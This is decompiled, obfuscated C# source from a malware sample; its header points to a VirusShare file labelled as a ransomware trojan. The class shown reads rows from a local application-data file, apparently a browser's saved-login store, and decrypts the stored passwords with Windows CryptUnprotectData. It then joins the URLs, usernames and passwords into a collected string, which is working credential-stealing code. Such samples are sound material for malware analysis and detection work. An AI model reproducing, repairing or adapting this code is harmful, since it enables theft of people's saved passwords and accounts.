// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0003;
using \u0004;
using \u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal class \u0003
  {
    public static string \u0001;
    public static string \u0002;
    [NonSerialized]
    internal static \u0005 \u0003;

    public static void \u0001()
    {
      string str1 = \u0011.\u0081(\u0010.\u0080(Environment.SpecialFolder.LocalApplicationData), \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6656), \u0001.\u0003.\u0003(348)));
      try
      {
        \u0002 obj = new \u0002(str1);
        \u0002.\u0001(\u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6737), \u0001.\u0003.\u0003(348)));
        if (!\u0012.\u0083(str1))
          return;
        int num1 = checked (\u0002.\u0001() - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          string str2 = \u0002.\u0001(num2, \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6754), \u0001.\u0003.\u0003(348)));
          string str3 = \u0002.\u0001(num2, \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6779), \u0001.\u0003.\u0003(348)));
          string str4 = \u0001.\u0003.\u0001(\u0005\u0002.\u007E\u009B\u0002((object) \u0004\u0002.\u0098\u0002(), \u0002.\u0001(num2, \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6808), \u0001.\u0003.\u0003(348)))));
          if (\u0007.\u001A(str3, \u0001.\u0003.\u0003(290), false) != 0 & \u0007.\u001A(str4, \u0001.\u0003.\u0003(290), false) != 0)
          {
            string[] strArray = new string[13]
            {
              \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6837), \u0001.\u0003.\u0003(348)),
              \u0001.\u0003.\u0003(6898),
              \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6903), \u0001.\u0003.\u0003(348)),
              str2,
              \u0001.\u0003.\u0003(6898),
              \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6920), \u0001.\u0003.\u0003(348)),
              str3,
              \u0001.\u0003.\u0003(6898),
              \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6945), \u0001.\u0003.\u0003(348)),
              str4,
              \u0001.\u0003.\u0003(6898),
              \u0004.\u0001.\u0001(\u0001.\u0003.\u0003(6970), \u0001.\u0003.\u0003(348)),
              \u0001.\u0003.\u0003(7027)
            };
            \u0001.\u0003.\u0001 = \u008D.\u001C\u0002(strArray);
            \u0001.\u0003.\u0002 = \u0011.\u0081(\u0001.\u0003.\u0002, \u0001.\u0003.\u0001);
          }
          checked { ++num2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool \u0001(
      [In] ref \u0001.\u0003.\u0003 obj0,
      [In] string obj1,
      [In] ref \u0001.\u0003.\u0003 obj2,
      [In] IntPtr obj3,
      [In] ref \u0001.\u0003.\u0002 obj4,
      [In] int obj5,
      [In] ref \u0001.\u0003.\u0003 obj6);

    public static string \u0001([In] byte[] obj0)
    {
      \u0001.\u0003.\u0003 obj1 = new \u0001.\u0003.\u0003();
      \u0001.\u0003.\u0003 obj2 = new \u0001.\u0003.\u0003();
      GCHandle gcHandle = \u0015\u0002.\u0007\u0003((object) obj0, GCHandleType.Pinned);
      obj1.\u0002 = gcHandle.AddrOfPinnedObject();
      obj1.\u0001 = obj0.Length;
      gcHandle.Free();
      ref \u0001.\u0003.\u0003 local1 = ref obj1;
      \u0001.\u0003.\u0003 obj3;
      \u0001.\u0003.\u0003 obj4 = obj3;
      ref \u0001.\u0003.\u0003 local2 = ref obj4;
      IntPtr num1;
      IntPtr num2 = num1;
      \u0001.\u0003.\u0002 obj5;
      \u0001.\u0003.\u0002 obj6 = obj5;
      ref \u0001.\u0003.\u0002 local3 = ref obj6;
      ref \u0001.\u0003.\u0003 local4 = ref obj2;
      \u0001.\u0003.\u0001(ref local1, (string) null, ref local2, num2, ref local3, 0, ref local4);
      byte[] numArray = new byte[checked (obj2.\u0001 + 1)];
      \u0016\u0002.\u0008\u0003(obj2.\u0002, numArray, 0, obj2.\u0001);
      string str = \u0006\u0002.\u007E\u009C\u0002((object) \u0004\u0002.\u0098\u0002(), numArray);
      return \u0017\u0002.\u007E\u000E\u0003((object) str, 0, checked (global::\u0003.\u007E\u0004((object) str) - 1));
    }

    static \u0003() => \u0002.\u0001(typeof (\u0001.\u0003));

    [Flags]
    public enum \u0001
    {
      \u0001 = 1,
      \u0002 = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u0002
    {
      public int \u0001;
      public \u0001.\u0003.\u0001 \u0002;
      public IntPtr \u0003;
      public string \u0004;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u0003
    {
      public int \u0001;
      public IntPtr \u0002;
    }
  }
}
